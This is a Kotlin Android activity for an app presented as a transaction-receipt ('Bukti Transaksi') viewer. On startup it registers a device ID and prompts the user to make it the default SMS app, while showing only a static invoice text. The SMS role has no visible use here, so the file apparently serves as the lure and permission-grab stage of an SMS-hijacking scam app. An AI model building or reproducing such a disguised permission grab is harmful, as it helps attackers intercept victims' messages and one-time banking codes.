package com.buktitransaksi.app

import android.app.role.RoleManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Divider
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

class MainActivity : ComponentActivity() {

    private val requestRole = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()
    ) { }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        DeviceIdHelper.getOrCreateDeviceId(this)
        checkDefaultSms()

        setContent {
            MaterialTheme {
                InvoiceScreen()
            }
        }
    }

    private fun checkDefaultSms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            if (!roleManager.isRoleAvailable(RoleManager.ROLE_SMS) || roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                return
            }
            val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
            requestRole.launch(intent)
        } else {
            val defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(this)
            if (defaultSmsPackage != packageName) {
                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                startActivity(intent)
            }
        }
    }
}

@Composable
fun InvoiceScreen() {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp)
            .verticalScroll(rememberScrollState())
    ) {
        Text(
            text = "Bukti Transaksi",
            fontSize = 22.sp,
            fontWeight = FontWeight.Bold,
            color = Color.Black
        )
        Spacer(Modifier.height(8.dp))
        Divider(color = Color.Gray)
        Spacer(Modifier.height(16.dp))
        Text(
            text = Constants.INVOICE_TEXT,
            fontSize = 14.sp,
            color = Color.Black,
            lineHeight = 22.sp
        )
    }
}
